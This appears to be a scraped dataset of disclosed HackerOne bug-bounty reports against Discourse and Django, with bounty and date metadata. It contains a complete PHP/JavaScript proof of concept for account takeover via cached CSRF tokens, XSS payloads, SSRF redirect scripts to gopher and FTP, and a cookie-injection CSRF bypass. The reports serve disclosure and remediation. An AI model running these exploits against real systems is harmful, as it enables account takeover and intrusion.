Code 2.44 KiBWrap lines Copy Download1<?
2$discourse = ""https://discourse.instance.behind.cloudflare.proxy""; //like https://try.discourse.org but behind CloudFlare
3$email_to_change_to = ""changetothis@example.com"";
4
5if(!empty($_GET['fetch'])) {
6	$f = @intval($_GET['f']);
7	$ctx = stream_context_create(array('http' => array('ignore_errors' => true)));
8	$data = file_get_contents($discourse.'/u/'.$f.'.css', false, $ctx);
9	preg_match('/name=""csrf-token"" content=""([a-zA-Z0-9\/=+]+)""/', $data, $matches);
10	if(!empty($matches[1])) {
11		preg_match('/X-Discourse-Username: (.*)/', implode(""\n"", $http_response_header), $name_matches);
12		echo $matches[1].';'.$name_matches[1];
13	} else {
14		echo 'error';
15	}
16	exit;
17}
18#random file to taint with csrf-token
19$rand = mt_rand(100000,999999);
20?>
21<html>
22  <body>
23	<img src=""<?=$discourse?>/u/<?=$rand?>.css"" />
24	<img src=""<?=$discourse?>/u/<?=$rand?>.css"" />
25	<img src=""<?=$discourse?>/u/<?=$rand?>.css"" onerror=""f()"" />
26<script>
27var user = '', change_email_to = '<?=$email_to_change_to?>';
28function f() {
29	fetch('?fetch=1&f=<?=$rand?>').then(function(e){return e.text()}).then(function(e){
30		if(e == 'error') { alert('You are currently running the PHP on a different Cloudflare region'); return; }
31		user = e.split(';')[1];
32		document.getElementById('f').action = '<?=$discourse?>/users/'+user+'/preferences/email'
33		submitRequest(e.split(';')[0])
34	})
35}
36function submitRequest(csrf) {
37  var xhr = new XMLHttpRequest();
38  xhr.onerror = function () {
39    console.log(xhr.readyState)
40	if(xhr.readyState == 4) {
41		alert('Account email for ' + user + ' has been changed to: ' + change_email_to);
42	}
43  };
44  xhr.open(""POST"", ""<?=$discourse?>/users/""+user+""/preferences/email.json"", true);
45  xhr.setRequestHeader(""Accept"", ""text\/html"");
46  xhr.setRequestHeader(""Content-Type"", ""application\/x-www-form-urlencoded"");
47  xhr.withCredentials = true;
48  var body = ""_method=PUT&email="" + encodeURIComponent(change_email_to) +""&authenticity_token="" + encodeURIComponent(csrf);
49  var aBody = new Uint8Array(body.length);
50  for (var i = 0; i < aBody.length; i++)
51    aBody[i] = body.charCodeAt(i); 
52  xhr.send(new Blob([aBody]));
53}
54</script>
55    <form action="""" id=""f"" method=""POST"">
56      <input type=""hidden"" name=""&#95;method"" value=""PUT"" />
57      <input type=""hidden"" name=""email"" value=""<?=$email_to_change_to?>"" />
58      <input type=""hidden"" name=""authenticity&#95;token"" id=""csrf"" value="""" />
59      <input type=""submit"" style=""display: none;"" value=""Submit request"" />
60	  Please wait...
61    </form>
62  </body>
63</html>
If you try this against a Discourse instance while being signed in, you should see something like this when visiting this script:
Image F213374: Screen_Shot_2017-08-16_at_14.56.30.png 289.67 KiBZoom in Zoom out Copy Download
Mitigations
Add the no-cache headers, Cache-Control and/or Expire on any of the templates that outputs the CSRF-token, this will prevent CloudFlare from caching information which is user specific. I would also recommend doing the same thing when the X-Discourse-Username is returned.
Let me know if you need any additional information.
Regards,
Frans2 attachments:F213373: Screen_Shot_2017-08-16_at_14.07.00.pngF213374: Screen_Shot_2017-08-16_at_14.56.30.pngasuka   changed the status to Needs more info. Aug 28th (5 years ago)Hello @fransrosen, thanks for your report! We need some more information before we can properly review this report. Is it possible you could provide a PoC instance behind Cloudflare showing how the issue could be exploited?  Thanks again for your report and we hope to hear back from you soon. 
    
    
        
            
                
                
                
            
        
    
fransrosen   changed the status to New. Updated Jan 14th (5 years ago)Hi,
Sorry for the late reply here. I finally got an approval from Algolia to make my PoC using their Discourse-instance, which was also the site I found this on initially. Their setup of Discourse is using SSO to their regular site, but I can still do the account takeover by changing the email address in Discourse.
The bug is reproducible in Firefox, for some reason the SameSite: Lax is not really working in that browser, so _forum_session is still sent with the image embedding from my test-page, and the form-posting with the CSRF-token actually also works. I'm testing with Firefox 57.0.4 in macOS 10.13.2.
You need to run the PHP-code in the same region as you're in when trying, this is because the CloudFlare region is the one doing the cache of .css. As mentioned, CloudFlare only have 13 regions so it should be fairly straight forward.
My code looks like this in the demo:
Code 2.40 KiBWrap lines Copy Download1<?
2$discourse = ""https://discourse.algolia.com"";
3$email_to_change_to = ""test99990@yoski.co"";
4$file = ""/u/%d.css"";
5
6if(!empty($_GET['fetch'])) {
7	$f = @intval($_GET['f']);
8	$file = sprintf($file, $f);
9	$ctx = stream_context_create(array('http' => array('ignore_errors' => true)));
10	$data = file_get_contents($discourse.$file, false, $ctx);
11	preg_match('/name=""csrf-token"" content=""([a-zA-Z0-9\/=+]+)""/', $data, $matches);
12	if(!empty($matches[1])) {
13		preg_match('/X-Discourse-Username: (.*)/', implode(""\n"", $http_response_header), $name_matches);
14		echo $matches[1].';'.$name_matches[1];
15	} else {
16		echo 'error';
17	}
18	exit;
19}
20#random file to taint with csrf-token
21$rand = mt_rand(100000,999999);
22$file = sprintf($file, $rand);
23?>
24<html>
25  <body>
26	<img src=""<?=$discourse.$file?>"" />
27	<img src=""<?=$discourse.$file?>"" />
28	<img src=""<?=$discourse.$file?>"" onerror=""f()"" />
29<script>
30var user = '', change_email_to = '<?=$email_to_change_to?>';
31function f() {
32	fetch('?fetch=1&f=<?=$rand?>').then(function(e){return e.text()}).then(function(e){
33		if(e == 'error') { alert('You are currently running the PHP on a different Cloudflare region'); return; }
34		user = e.split(';')[1];
35		document.getElementById('f').action = '<?=$discourse?>/users/'+user+'/preferences/email'
36		submitRequest(e.split(';')[0])
37	})
38}
39function submitRequest(csrf) {
40  var xhr = new XMLHttpRequest();
41  xhr.onerror = function () {
42    console.log(xhr.readyState)
43	if(xhr.readyState == 4) {
44		alert('Account email for ' + user + ' has been changed to: ' + change_email_to);
45	}
46  };
47  xhr.open(""POST"", ""<?=$discourse?>/users/""+user+""/preferences/email.json"", true);
48  xhr.setRequestHeader(""Accept"", ""text\/html"");
49  xhr.setRequestHeader(""Content-Type"", ""application\/x-www-form-urlencoded"");
50  xhr.withCredentials = true;
51  var body = ""_method=PUT&email="" + encodeURIComponent(change_email_to) +""&authenticity_token="" + encodeURIComponent(csrf);
52  var aBody = new Uint8Array(body.length);
53  for (var i = 0; i < aBody.length; i++)
54    aBody[i] = body.charCodeAt(i); 
55  xhr.send(new Blob([aBody]));
56}
57</script>
58    <form action="""" id=""f"" method=""POST"">
59      <input type=""hidden"" name=""&#95;method"" value=""PUT"" />
60      <input type=""hidden"" name=""email"" value=""<?=$email_to_change_to?>"" />
61      <input type=""hidden"" name=""authenticity&#95;token"" id=""csrf"" value="""" />
62      <input type=""submit"" style=""display: none;"" value=""Submit request"" />
63	  Please wait...
64    </form>
65  </body>
66</html>
And the flow looks like this:

Sign up for Algolia at https://www.algolia.com/users/sign_up
When done, go to https://discourse.algolia.com/ and ""Log in""
Make sure the PHP-file is running on the same CloudFlare region, you can try it locally by: php -S localhost:8000 algolia.php
Change the email address in the PHP-script to something else maybe, so you see that you indeed get the confirmation email sent to the new address to confirm the change.
Go to http://localhost:8000 in Firefox.

You should see an alert that the email was changed. This is also the point when the attacker gets a ""Confirm your new address"" to their inbox as my video shows.
PoC-video:
Video F253981: AlgoliaTakeover.mp4 8.16 MiBZoom in Zoom out Copy Download
The reason why all this works to refresh everyones memory on this bug, is that any path under /u/*.css will respond when signed in with CSRF-tokens in the error page. Since there are no proper Cache-Control headers on this 404 page, CloudFlare will happily cache the file since it thinks it's a CSS-file. If there would be a Cache-Control: no-cache whenever CSRF-tokens are in the templates, this attack would not work.
Also, to show you that it does in fact get cached on CloudFlare, here are the same URL tried in my region, and all of them are showing the user's CSRF-token when the file was requested, which is the one I'm using to trigger the email-change:
Image F253980: Screen_Shot_2018-01-14_at_23.44.51.png 357.33 KiBZoom in Zoom out Copy Download
Image F253979: Screen_Shot_2018-01-14_at_23.44.58.png 276.01 KiBZoom in Zoom out Copy Download
Code 210 BytesWrap lines Copy Download1local @ cache $ curl -s https://discourse.algolia.com/u/469843.css | grep csrf-token
2<meta name=""csrf-token"" content=""CaTKE2wq4jczCZO+LTasy6SvBBHxaYJr9giqym1PSaCtgz5IgofUOmrufGYdrnTgS8ZHM67/SPgUAroHv1zMFw=="" />
The only setup Algolia made here was to put the Discourse-application behind CloudFlare. This is a regular setup if you're using CloudFlare's proxy to speed up the website and to hide the origin and sometimes make sure you're protected against DDoS.
Hope this helps, and sorry for my late reply.
Regards,
Frans3 attachments:F253979: Screen_Shot_2018-01-14_at_23.44.58.pngF253980: Screen_Shot_2018-01-14_at_23.44.51.pngF253981: AlgoliaTakeover.mp4asuka   posted a comment. Jan 21st (5 years ago)Great find @fransrosen! We've escalated this to the development team to see if this is something they would like to fix, and will get back to you as soon as we have any updates.
Kind regards,
@asuka discourse_team Discourse staff  posted a comment. Updated Jan 31st (5 years ago)We view this as low priority but we do eventually want to make it so bad .css requests don't return 200.

The reason why all this works to refresh everyones memory on this bug, is that any path under /u/*.css will respond when signed in with CSRF-tokens in the error page
discourse_team Discourse staff  updated the severity to low. Jan 31st (5 years ago)discourse_team Discourse staff  changed the status to Needs more info. Jan 31st (5 years ago)We are not sure we can repro this? We are hitting try.discourse.org/u/samsaffron/activity.css and getting a response code of 406?
Code 397 BytesWrap lines Copy Download1jeff@WUMPUS:~$ curl -I https://try.discourse.org/u/samsaffron/activity.css
2HTTP/1.1 406 Not Acceptable
3Server: nginx/1.13.6
4Date: Wed, 31 Jan 2018 23:24:57 GMT
5Content-Type: text/html; charset=utf-8
6Content-Length: 0
7Connection: keep-alive
8X-Request-Id: c2757c97-24a1-484c-97a3-56d203acf8a5
9X-Runtime: 0.024248
10Discourse-Proxy-ID: app-router-tiehunter01
11Strict-Transport-Security: max-age=31415926
Is the report specific to the redirect routes /users and /my then?Discourse  rewarded fransrosen with a $256 bounty. Updated Feb 1st (5 years ago)We agree this was effectively a bug, we should not be returning 200 OK plus auth tokens for random URLs such as
Code 85 BytesWrap lines Copy Download1/u/my/preferences.css
2/u/my/preferences/username.css
3/u/my/preferences/card-badge.css
Although the impact is low (effectively CloudFlare specific) I am awarding at the medium level because this was such a well written and researched report -- thank you!
This is also fixed in master / latest.
    
    
        
            
                
                
                
            
        
    
fransrosen   changed the status to New. Feb 2nd (5 years ago)Thank you!
I haven't confirmed the fix yet but I have seen fixes been done by always serving Cache-Control: no-cache whenever the current user is signed in, as some cache settings in Cloudflare also allows caching 404 responses if no cache-header is present.
Great job, glad that it could get solved, sorry for the long delay of getting a proper PoC.discourse_team Discourse staff  closed the report and changed the status to Resolved. Feb 2nd (5 years ago)fransrosen   requested to disclose this report. Jul 9th (4 years ago)  This report has been disclosed. Aug 8th (4 years ago)",https://hackerone.com/reports/260697,Delaware,United States,Dover,2017,8,16,13,6
Discourse,11-50,0.0,10m-50m,$256.00,High,7.95,Cross-site Scripting (XSS) - Generic,DOM Based XSS in Discourse Search,"khizer47  submitted a report to Discourse.Dec 17th (6 years ago)Steps to Reproduce:

Load http://try.discourse.org
2.Now From Top Right Corner Click on Search Button 
Enter payload their 

Payload:
@<script>prompt(1337)</script>gmail.com
4: Now in new windows that opens click on advance search and The XSS will Occur :)
5: Now copy the link and send to victim there the XSS will Occur To 
Thanks
Khizer Javed",https://hackerone.com/reports/191890,Delaware,United States,Dover,2016,12,17,7,29
Discourse,11-50,0.0,10m-50m,$256.00,High,7.95,Improper Access Control - Generic,Gaining access to private topics using quoting feature,"mishre  submitted a report to Discourse.Feb 5th (5 years ago)Description
Some topics have limited access to certain groups and users, and while there exists a validation for access on this topic, it can be bypassed by abusing a vulnerability in the ""onebox"" quoting feature.
When pasting a link in a reply, if this link happens to be a link to another topic on Discourse a small preview is shown which includes the topic content or the post content where the link is pointing to. Also there are some protections in place to make sure that the user can view the linked content, the said protections can be bypassed by adding a query string parameter to the link containing the value 
Code 34 BytesWrap lines Copy Download1?source_topic_id={victim-topic-id}
Steps to reproduce

Login as an administrator to Discourse and create a topic which can only be viewed by the staff.
Copy the topic's id from the topic's page. the topic id can be found by browsing the topic and then copying the number in the end of the url (http://localhost:4000/t/{topic-name}/{topic-id})
Login with a non-admin user.
Go to any topic you have access to, and type in the following reply:

Code 51 BytesWrap lines Copy Download1http://localhost:80/t/blablabla/?source_topic_id=29
please note that the port should 80 or 443 even if the url of your local installation is a different (probably some software bug)
5. Wait for the preview to load and see that you can see topic's content.
Root cause
The following piece of code determines if the logged-in user is capable of viewing the post/topic :
Code 475 BytesWrap lines Copy Download1        def can_see_post?(post, source_topic)
2          return false if post.nil? || post.hidden || post.trashed? || post.topic.nil?
3          Guardian.new.can_see_post?(post) || same_category?(post.topic.category, source_topic)
4        end
5
6        def can_see_topic?(topic, source_topic)
7          return false if topic.nil? || topic.trashed? || topic.private_message?
8          Guardian.new.can_see_topic?(topic) || same_category?(topic.category, source_topic)
9        end
as can be seen here: https://github.com/discourse/discourse/blob/master/lib/onebox/engine/discourse_local_onebox.rb#L113
However, the source_topic parameter is controlled directly by user input:
Code 59 BytesWrap lines Copy Download1source_topic_id = @url[/[&?]source_topic_id=(\d+)/, 1].to_i
as can be seen here:
https://github.com/discourse/discourse/blob/master/lib/onebox/engine/discourse_local_onebox.rb#L47
So if we pass in the same topic id as the one we are trying to view, basically the function same_category will always return true, effectively bypassing any protection in place.
Impact
An attacker will be able to access all private topics and posts on Discourse.",https://hackerone.com/reports/312647,Delaware,United States,Dover,2018,2,5,21,45
Discourse,11-50,0.0,10m-50m,$64.00,Low,2.0,Information Disclosure,SSRF in upload IMG through URL,"mariuszpoplawski  submitted a report to Discourse.May 14th (6 years ago)-Short description
Private message function is vulnerable is vulnerable to a SSRF vulnerability which allows an attacker to craft connections originating from  servers to any destination on the internet and discourse internal network and craft outgoing UDP-packet (for example, to connect to  FTP  servers from discourse).
read more at:
https://cwe.mitre.org/data/definitions/918.html


Load http://try.discourse.org


Go to new message composer


Set the receiver, topic
4 set the message content
TEST  


Set the malicious3.php file on your remote server to:


Code 72 BytesWrap lines Copy Download1<?php
2        header('Location: gopher://192.166.218.53:80/test123');
3?>


Send the private message.


Check your remote server, in my case ""192.166.218.53"" web logs file (access.log)
OUTPUT :


64.71.168.198 - - [14/May/2017:16:38:04 -0400] ""HEAD /malicious3.php HTTP/1.1"" 302 187 ""-"" ""Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36""
64.71.168.198 - - [14/May/2017:16:38:04 -0400] ""GET /malicious3.php HTTP/1.1"" 302 225 ""-"" ""Ruby""
64.71.168.198 - - [14/May/2017:16:38:04 -0400] ""HEAD /test123 HTTP/1.1"" 404 140 ""-"" ""Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36""


Request for FTP connection



Load http://try.discourse.org


Go to new message composer


Set the receiver, topic


set the message content
TESTs  


Set the malicious3.php file on your remote server to:


Code 59 BytesWrap lines Copy Download1<?php
2        header('Location: ftp://192.166.218.53/');
3?>


Send the private message.


Check your remote server, in my case ""192.166.218.53"" ftp  logs file. (vsftp.log).
OUTPUT :
Sun May 14 15:29:40 2017 [pid 18354] CONNECT: Client ""::ffff:64.71.168.198""




Here is the burp suite request:

POST /posts HTTP/1.1
Host: try.discourse.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
X-CSRF-Token: 1QJrm4k6xUHhUyhoEJUElbbSVsufYPnbQd8N+Jti7/TtHEJxOpfDairKu0ufS/ovBIWt/mtdISC36Tx8OMdD/w==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Discourse-Visible: true
X-Requested-With: XMLHttpRequest
Referer: https://try.discourse.org/t/adsadas/835/7
Content-Length: 437
Cookie: utma=228756441.806995719.1494765035.1494768541.1494792827.3; utmc=228756441; utmz=228756441.1494765035.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _forum_session=V29LcnpQVXRTdWJ5dUdkWXQxOEhRRXFHRk5vbmtMS2lhRHdqVXdsYjRpUzhpQ2I1OHBLZVFZVFJqUXFtTUZXM0p0MTJwNWh0M3k3Y0R0NDl0VFBjR3hBQkZZMUlMbno5eTQvOEZtZkdjTFNzTVBNL1R1SDRua1BVMWtpTURyWXR3bnNGeWFPb1pBQnFpQW1ORFllNG04bWthUkFVZ01YTm9PWVB2dS96bmUybXkxU1ZaS2c1WkVlbExwK0pRMjlvaGF6WWY5bi9WeGlrd2xFNmtUYWhUaE01OHVRT05acFJWV3AyQXhUQ1U4YVpVZDV6UVFjSDBtc2NJa3R6dE1aeDVnaE9BblBKK0J4QVlKdGMxQmtYSTNZaGlJL1NFL3lma2pRVktIZWROazZnMTlmbXpSRDFTeVRWeHMveS9HckYxQXdjZ2dZQjdIVmV3aW4reUgzYjNwUWJ2YXVYY0Z4cWlrL2dzeXBmUGoxZVdhQ0JBTTFKZlB3SWhiZ24yZHZkVGYzYVJFb3lJZEhVTENxbHc1WWN1eDdrVGlVTHNLMTZEMG12WTJnVVNQRVhkWEhoTU1EUDNyQVZUdklkdmQwSlNhSlZVcXhQL3FFSzRqWmRyeFozV3BxRWtrK3FuZzBsWnlXVmVJeFVxNTBOMk5YVnR4d21kTXlIaEtlakp3aEJPZURoNm11Uy83d3l6U09kZnNrNnNiUEJBSjRQT0xXdWtqdlUxak5LK2MyaW1kbUlSRGtjWWo5eWJZT21OMk9ScmNFd1o2OG4xUTNIV0ZoVHJlVTFFSUlxKy9RbmZERDRtQ1dKaDVtSFBEeFZXMTNsOEcrMG13Vzc3c1R3R2hJMUdNOHJHT0lHRU93U20waG5pajhRQTZVNmhGT0tVTmNZa1d6TW5HSVg3c2pvTUkrNjhNZFpwRHVyalFVSWVWa0ktLTdpcUxTWCs5dEhsVHRFekRDQ3FLUHc9PQ%3D%3D--3bf9351bc59d99d10f831dcc1e647054ddef3c41; utmb=228756441.9.10.1494792827; _t=aebe2511952a805cec46af434b6617d5
Connection: close
raw=TESTa+%5B!%5B%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)&unlist_topic=false&category=&topic_id=835&is_warning=false&archetype=regular&typing_duration_msecs=100&composer_open_duration_msecs=9183&featured_link=&image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bwidth%5D=24&image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bheight%5D=24&nested_post=true

The attacker is able to send internal server side requests using Ruby client.
Check the attached screens for prove.
Why does the vulnerability exist?
discourse.org does not properly validate user input and does not configure ruby client properly which allows an attacker to use various  protocol wrappers other than http(s). For example, an attacker can supply ftp://test.com/file as an URL and discourse will make such a FTP request.
If the description is not clear please feel free to ask us for more detailed report.
regards www.afine.pl4 attachments:F184573: ftp_request.pngF184574: gopher.pngF184575: request.pngF184576: request_output.pngSummary by mariuszpoplawskiThe discourse.org upload function through URL in message content was vulnerable to Server side request forgery. Attacker was able to send internal / external requests using 2 different  client used by discourse.org including Ruby client. As an example we showed requests to ftp:// resources. I consider the vulnerability more risky then discourse.org team because the remote users should not be allow to send internal server side requests.",https://hackerone.com/reports/228377,Delaware,United States,Dover,2017,5,14,21,5
Discourse,11-50,0.0,10m-50m,$256.00,High,8.2,Cross-site Scripting (XSS) - Stored,"Stored XSS in ""post last edited"" option","luigigubello  submitted a report to Discourse.Apr 4th (5 years ago)
There are two users: Attacker and Victim.
Attacker starts a private talk via private message with the Victim.
Attacker send a message to Victim, then he edits it or deletes it.
Victim sees the yellow pencil, symbol of the edit.
Victim clicks on yellow pencil to see the edit and the XSS runs.

Other info: the XSS also runs on topic (video PoC #2). You can find my XSS message on this URL:
https://try.discourse.org/t/recommended-reading-for-community-and-foss-enthusiasts/278
It is very dangerous because it can hit many users at the same time.
Impact
XSS can use to steal cookies, password or to run arbitrary code on victim's browser
The hacker selected the Cross-site Scripting (XSS) - Stored weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
URL
https://try.discourse.org/t/recommended-reading-for-community-and-foss-enthusiasts/278
Verified
Yes2 attachments:F282022: discourse_stored_xss_2.mp4F282023: discourse_stored_xss.mp4",https://hackerone.com/reports/333507,Delaware,United States,Dover,2018,4,4,18,48
Discourse,11-50,0.0,10m-50m,$256.00,High,7.95,Cross-site Scripting (XSS) - Generic,Stored XSS in topics because of whitelisted_generic engine vulnerability,"skavans  submitted a report to Discourse.Jan 12th (6 years ago)Hello!
Steps to reproduce:

Paste this payload URL in the topic: http://89.223.28.48/og_image.html?uncache1234
Save the post and you will see the XSS will fire
Image F151911: ______________2017-01-12___21.03.14.png 129.80 KiBZoom in Zoom out Copy Download

Though you now escape the OpenGraph data, the whitelisted_generic onebox engine decodes variables values back at lines: 202 and 207.
Then these decoded values are injected in the raw HTML here and here that leads to XSS attack possibility.
Example post with stored XSS inside is: https://try.discourse.org/t/testing-is-in-progress/620
Please let me know if you need some extra information to locate and fix the bug. 1 attachment:F151911: ______________2017-01-12___21.03.14.pngdiscourse_team Discourse staff  changed the status to Triaged. Jan 12th (6 years ago)discourse_team Discourse staff  closed the report and changed the status to Resolved. Jan 20th (6 years ago)Discourse  rewarded skavans with a $256 bounty. Jan 20th (6 years ago)discourse_team Discourse staff  posted a comment. Jan 20th (6 years ago)Thanks for your help on both of these :)skavans   posted a comment. Jan 20th (6 years ago)Thanks for bounty ;)skavans   posted a comment. Jan 20th (6 years ago)Can we disclose?discourse_team Discourse staff  requested to disclose this report. Jan 20th (6 years ago)skavans   agreed to disclose this report. Jan 20th (6 years ago)  This report has been disclosed. Jan 20th (6 years ago)",https://hackerone.com/reports/197902,Delaware,United States,Dover,2017,1,12,18,15
Discourse,11-50,0.0,10m-50m,$256.00,High,7.95,Cross-site Scripting (XSS) - Generic,Stored XSS in posts because of absence of oembed variables values escaping,"skavans  submitted a report to Discourse.Jan 12th (6 years ago)Hello!
Steps to reproduce:

Paste this payload URL in the post: http://89.223.28.48/oembed_video.html?uncache
Save the post and you will see the XSS will fire.

Image F151922: ______________2017-01-12___22.17.11.png 68.24 KiBZoom in Zoom out Copy Download
The vulnerability exists because of absence of oembed variables values escaping.
There is the oembed link in the payload page:
Code 76 BytesWrap lines Copy Download1<link type='application/json+oembed' href='http://89.223.28.48/oembed.json'>
As you can see the onebox parser goes to this oembed URL to get the data:
Code 193 BytesWrap lines Copy Download164.71.168.198 - - [12/Jan/2017:19:13:52 +0000] ""GET /oembed_video.html HTTP/1.1"" 200 388 ""-"" ""Ruby""
264.71.168.198 - - [12/Jan/2017:19:13:52 +0000] ""GET /oembed.json HTTP/1.1"" 200 389 ""-"" ""Ruby""
The content of oembed.json is:
Code 170 BytesWrap lines Copy Download1{
2        ""type"": ""image"",
3        ""image"": ""xss"",
4        ""description"": ""descr' onerror='alert(/XSS by skavans/)"",
5        ""image_width"": 1,
6        ""image_height"": 1
7}
So the unescaped data is injected in the raw HTML at this line of generic_whitelisted onebox engine that leads to XSS vulnerability.
The example post with stored XSS inside is: https://try.discourse.org/t/this-is-just-one-test/632
Please let me know if you need some extra information to locate and fix the bug.1 attachment:F151922: ______________2017-01-12___22.17.11.pngskavans   posted a comment. Updated Jan 12th (6 years ago)Please use this payload URL better because I have used the ""description"" field in the report example but this field is decoded back by engine so it have looked very similar to the #197914 report though this is different vulnerability in fact.
http://89.223.28.48/oembed_video.html?uncache88discourse_team Discourse staff  changed the status to Triaged. Jan 12th (6 years ago)discourse_team Discourse staff  closed the report and changed the status to Resolved. Jan 20th (6 years ago)Discourse  rewarded skavans with a $256 bounty. Jan 20th (6 years ago)skavans   posted a comment. Jan 20th (6 years ago)Can we disclose?discourse_team Discourse staff  requested to disclose this report. Jan 20th (6 years ago)skavans   agreed to disclose this report. Jan 20th (6 years ago)  This report has been disclosed. Jan 20th (6 years ago)",https://hackerone.com/reports/197914,Delaware,United States,Dover,2017,1,12,19,24
Discourse,11-50,0.0,10m-50m,$128.00,Medium,5.45,Privilege Escalation,Users can bookmark other user's messages,strukt  submitted a report to Discourse.Dec 20th (6 years ago),https://hackerone.com/reports/192611,Delaware,United States,Dover,2016,12,20,4,3
Discourse,11-50,0.0,10m-50m,$256.00,High,7.95,Cross-site Scripting (XSS) - Generic,XSS in topics because of bandcamp preview engine vulnerability,"skavans  submitted a report to Discourse.Jan 11th (6 years ago)
Load http://try.discourse.org
Click ""New topic""
Enter this payload https://89.223.28.48/bandcamp.com/album/index.html?XSSa2 to field with placeholder ""Type title or paste a link here""
Wait for the preview engine to parse the link
XSS will fire

Image F151439: ______________2017-01-11___5.23.20.png 2.52 MiBZoom in Zoom out Copy Download
You should sanitize external data in this engine and replace matches_regexp from
^https?:\/\/.*bandcamp\.com\/album\/
to
^https?:\/\/.*\.bandcamp\.com\/album\/
to fix the issue.1 attachment:F151439: ______________2017-01-11___5.23.20.png",https://hackerone.com/reports/197443,Delaware,United States,Dover,2017,1,11,2,43
Discourse,11-50,0.0,10m-50m,$256.00,High,7.95,Cross-site Scripting (XSS) - Generic,XSS vulnerability on Audio and Video parsers,"alberto__segura  submitted a report to Discourse.Dec 18th (6 years ago)Just like in the XSS vulnerability on Image parser, there is the same vulnerability on Audio (https://github.com/discourse/onebox/blob/394409ca319cc1a1cd31fefa50c9468c990531a3/lib/onebox/engine/audio_onebox.rb) and Video (https://github.com/discourse/onebox/blob/394409ca319cc1a1cd31fefa50c9468c990531a3/lib/onebox/engine/video_onebox.rb) parsers.
A malicious user can include a ""fake"" audio or video URL with a ' character, allowing him to execute Javascript code. 
Audio URL example: http://host/path'onerror=alert(1);//k.mp3
Video URL example: http://host/path'onerror=alert(1);//k.mp4
Ask me if you need more info to reproduce the vulnerability.
Best regards,
Albertodiscourse_team Discourse staff  changed the status to Triaged. Dec 18th (6 years ago)discourse_team Discourse staff  closed the report and changed the status to Resolved. Dec 19th (6 years ago)OK thank you, this is now fixed.Discourse  rewarded alberto__segura with a $256 bounty. Jan 10th (6 years ago)Thanks for this report!alberto__segura   posted a comment. Jan 10th (6 years ago)Thank you very much!!
Can we disclose?discourse_team Discourse staff  requested to disclose this report. Jan 10th (6 years ago)alberto__segura   agreed to disclose this report. Jan 10th (6 years ago)  This report has been disclosed. Jan 10th (6 years ago)",https://hackerone.com/reports/192223,Delaware,United States,Dover,2016,12,18,14,46
Discourse,11-50,0.0,10m-50m,$256.00,High,7.95,Cross-site Scripting (XSS) - Generic,XSS Vulnerability on Image link parser,"alberto__segura  submitted a report to Discourse.Dec 17th (6 years ago)I found a XSS (Cross-Site Scripting) vulnerability, and it is present in the markdown parser when it tries to parse an image URL.
To reproduce the vulnerability you need to add a fake image url like:
http://host/path/to/image'onerror=alert(1);//.png
As you can see, we have an invalid image URL which finish with an image extension (PNG). By putting the ' we are able to break the ""img"" tag in which the image url is included by the parser and add custom code, allowing us to run Javascript code. A malicious user could use the $.getScript function to load a malicious script.
If you need more information about the vulnerability, please, feel free to reply.",https://hackerone.com/reports/191909,Delaware,United States,Dover,2016,12,17,9,8
Django,1-10,1.0,No value,"$1,000.00",No value,0.0,None,CSRF protection bypass on any Django powered site via Google Analytics,"bobrov  submitted a report to Django.Sep 1st (8 years ago)I shall explain all the steps to create the final PoC in order to be more clear.
Part 1. Cookie Injection via Google Analytics
(Reported to Google, rewarded, still working)


Google Analytics sets the cookie to track user source:
__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]
For example:
__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/


User fully controls path in Referer and it is not filtered before being put in __utmz


Part 2. Cookie parsing peculiarities by different web servers


A typical Cookie sent by a web browser looks like this:
Cookie: param1=value1; param2=value2;


Many web servers accept cookies delimited not only by semicolons but also by commas:
Cookie: param1=value2, param2=value2
Cookie: param1=value2,param2=value2


Python + Django handle cookies with incorrect regular expression that allows to use characters [ \ ] as delimiters:
Cookie: param1=value1]param2=value2


https://docs.python.org/3/library/http.cookies.html
http://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432
http://tools.ietf.org/html/rfc2109
http://tools.ietf.org/html/rfc2068
Example:
Code 133 BytesWrap lines Copy Download1>>> from http import cookies
2>>> C = cookies.SimpleCookie()
3>>> C.load('__utmz=blah]csrftoken=x')
4>>> C
5<SimpleCookie: csrftoken='x'>
Part 3. Cookie handling peculiarities in different web browsers
(Reported to Google, won't fix)


For all the web browsers except Safari characters of space, comma, and [ \ ] can be used as cookie values


Chrome handles only a limited number of cookie-attributes, e.g.:
Set-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;
will set cookie for .google.com but not for blah.blah.blah.google.com


Combining all these facts
Provided that:

A site uses Google Analytics
This site is hosted by a web server that has some of the aforementioned cookie parsing peculiarities (e.g. Django)
This site implements Cookie based CSRF protection (a value in Cookie and some request parameter must be equal)

Then:

We can set new arbitrary cookies or redefine the values of existing ones
This site is vulnerable to CSRF protection bypass

The principal problem of __utmz cookie is that it is set for six months and is not refreshed. This problem can be solved in Google Chrome if you find a subdomain with Google Analytics and rewrite attribute ""domain"" using the peculiarity that has been described in part 3 with the value "".site.com"".
In other browsers the vulnerability can be exploited by cookie injection at the moment of __utmz refreshing.
PoC
Vulnerability exploitation on instagram.com with Google Chrome
(Reported to Facebook, redirected to Django Team)

Open Google Chrome in incognito mode
Authenticate on instagram.com
Click the link and wait some seconds
Result - follow http://instagram.com/black2fan

